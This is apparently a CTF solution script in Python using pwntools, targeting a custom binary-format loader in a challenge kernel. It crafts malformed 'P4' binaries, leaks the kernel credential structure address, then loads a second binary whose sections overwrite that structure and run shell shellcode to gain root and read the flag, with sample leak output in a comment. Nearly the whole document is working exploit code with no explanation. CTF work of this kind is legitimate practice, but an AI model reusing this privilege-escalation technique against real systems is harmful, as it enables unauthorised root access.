#!/usr/bin/env python
from pwn import *
import base64
import re

# p4{4r3_y0U_4_81n4ry_N1njA?}

context.arch = 'amd64'
host , port = 'p4fmt.zajebistyc.tf' , 30002
y = remote( host , port )

def gen_p4_binary( version = 0 , arg = 1 , section_header_offset = 0x18 , sections_len = 0 , entry = 0 , sections = [] , code = '' ):
    b = 'P4' # MAGIC
    b += p8( version ) + p8( arg ) + p32( sections_len ) + p64( section_header_offset ) + p64( entry )
    b += ''.join( flat(s) for s in sections )
    if code:
        b = b.ljust( entry & 0xfff , '\0' )
        b += code
    return b

def sp( cmd ):
    y.sendlineafter( '$' , cmd )

def leak():
    sp( './leak' )
    y.recvuntil( 'length=' )
    cred = int( y.recvuntil( ',' )[:-1] , 16 )
    success( 'cred -> %s' % hex( cred ) )
    return cred

sp( 'cd /tmp' )

p4 = gen_p4_binary( section_header_offset = 0x90 , sections_len = 1 )
sp( "echo %s | base64 -d > ./leak" % ( base64.b64encode( p4 ) ) )
sp( 'chmod +x ./leak' )
cred = leak() # 1

p4 = gen_p4_binary( sections = [[0x7000000 | 7, 0x1000, 0], [cred | 8 + 0x10, 0x48, 0]] , sections_len = 2  , entry = 0x7000090 , code = asm( shellcraft.sh() ) )
sp( 'printf \'\\%s\' > ./pwn' % '\\'.join( oct( ord( _ ) )[1:].rjust( 3 ,'0' ) for _ in p4 ) )
sp( 'chmod +x ./pwn' )

'''
[+] cred -> 0xffff99cb021fa180
[+] cred -> 0xffff99cb021faf00
[+] cred -> 0xffff99cb021fab40
[+] cred -> 0xffff99cb021faa80
[+] cred -> 0xffff99cb021facc0

[+] cred -> 0xffff99cb021fa180
[+] cred -> 0xffff99cb021faf00
[+] cred -> 0xffff99cb021fab40
[+] cred -> 0xffff99cb021faa80
[+] cred -> 0xffff99cb021facc0
'''

for _ in range(3):
    leak()

sp( './pwn' ) # cred should be the same as first leak

y.sendlineafter( '/tmp #' , 'cat /flag' ) # root !

y.interactive()
